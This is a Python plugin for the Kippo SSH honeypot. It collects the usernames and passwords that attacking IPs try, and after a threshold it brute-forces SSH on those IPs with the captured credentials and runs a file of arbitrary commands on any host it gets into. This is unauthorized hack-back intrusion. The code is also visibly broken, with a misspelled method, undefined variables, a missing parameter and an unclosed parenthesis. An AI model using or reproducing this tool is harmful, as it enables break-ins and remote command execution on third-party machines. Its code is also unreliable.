####
#
# By R4stl1n 
# 
# This is our "Plugin" since it is easier than rewriting code
#
# Note: Python Logging framework used as it is thread safe

# TODO:
#   Add extra configuration options from config
#   Add a ssh port scanner to find ssh server other ports
#   Ability to load other attacks
#   Save all attempted username and password
#   Database logging on execution results

import sys

from threading import Thread
from kippo.core import dblog
from twisted.enterprise import adbapi
from twisted.internet import defer
from twisted.python import log
from paramiko import SSHClient
from paramiko import AutoAddPolicy

import time
import uuid
import logging

class UserIpCombination:
    def __init__(self,target,username,password):
        self.target = target
        self.usernames = []
        self.passwords = []
        self.amount = 0

    def reset(self):
        self.usernames = []
        self.passwords = []
        self.amount = 0

class Connection (Thread):

    def __init__(self,combination,cfg):
        super(Connection, self).__init__()
        self.portNumber  = 2222
        self.timeoutTime = 5
        self.target = combination.target
        self.combination = combination
        self.cfg = cfg

    def run(self):
        for usernameC in self.combination.usernames:

            for passwordC in self.combination.passwords:
                sshConnection = SSHClient()

                sshConnection.set_missing_host_key_policy(AutoAddPolicy())     
                try:
                    sshConnection.connect(self.target, port = self.portNumber, username = usernameC,password = passwordC, timeout = self.timeoutTime, allow_agent = False,look_for_keys = False)
                    logging.info("[+] Access granted from: %s" % self.target)
                    self.commandsToExecute(sshConnection)
                    sshConnection.close()
                except:      
                    pass

    def commandsToExecute(sshConnection):    
        commandFile = cfg.get('database_deity', 'commandFile')
        commandFileVerbose = cfg.get('database_deity', 'commandFileVerbose')
        
        if commandFile is not None:
            logging.info('[+] Executing runscript on %s' % self.target)
            file = open(commandFile, 'r')
            for line in file:
                if commandFileVerbose == True:
                    stdin, stdout, stderr = client.exec_comm1and(line)
                    for line in stdout:
                        logging.info('[-] Execution %s: %s' % (self.target,line)
                else:
                    client.exec_command(line)
            logging.info('[+] Completed execution on %s' % self.target)

class Deity:

    def __init__(self,cfg):
        self.currentCombinations = []
        self.connections = []
        self.threshholdLimit = int(cfg.get('database_deity', 'threshhold'))
        self.cfg = cfg

    def __del__(self):
        for connection in self.connections:
            connection.join()

    def addCombinationEntry(self,ip,username,password):
        found = False

        for combination in self.currentCombinations:
            if combination.target == ip:
                found = True
                combination.usernames.append(username)
                combination.passwords.append(password)
                combination.amount = combination.amount + 1
                if combination.amount >= self.threshholdLimit:
                    logging.info('[*] Attempts from %s exceeded threshhold' % ip)
                    logging.info('[*] Initiating divine intervention on: %s' % ip)
                    connection = Connection(combination,self.cfg)
                    connection.start()
                    self.connections.append(connection)
                    combination.reset()

        if found == False:
            combination = UserIpCombination(ip,username,password)
            self.currentCombinations.append(combination)

class DBLogger(dblog.DBLogger):
 
    def __init__(self, cfg):
        self.peerIP = None
        self.peerPort = None
        self.deity = Deity(cfg)
        super(DBLogger,self).__init__(cfg)

    def start(self, cfg):
        # Tell paramiko to stop logging to our files
        logging.getLogger("paramiko").setLevel(logging.WARNING)
        logging.basicConfig(format='[%(asctime)s] - %(message)s'
            ,filename=cfg.get('database_deity', 'logfile'),level=logging.INFO)
        logging.info("------- {New logging session started} -------")

    def write(self, session, msg):
        pass

    def createSession(self, peerIP, peerPort, hostIP, hostPort):
        self.peerIP = peerIP
        self.peerPort = peerPort

    def handleConnectionLost(self, session, args):
        pass

    def handleLoginFailed(self, session, args):
        self.deity.addCombinationEntry(self.peerIP,args['username'],args['password'])
        logging.info('[!] Failed login attempt from:%s:{%s,%s}' % (self.peerIP,args['username'],args['password']))

    def handleLoginSucceeded(self, session, args):
        logging.info('[!] Login attempt was successful from:%s' % self.peerIP)

    def handleCommand(self, session, args):
        pass

    def handleUnknownCommand(self, session, args):
        pass

    def handleInput(self, session, args):
        pass

    def handleTerminalSize(self, session, args):
        pass

    def handleClientVersion(self, session, args):
        pass

    def handleFileDownload(self, session, args):
        pass

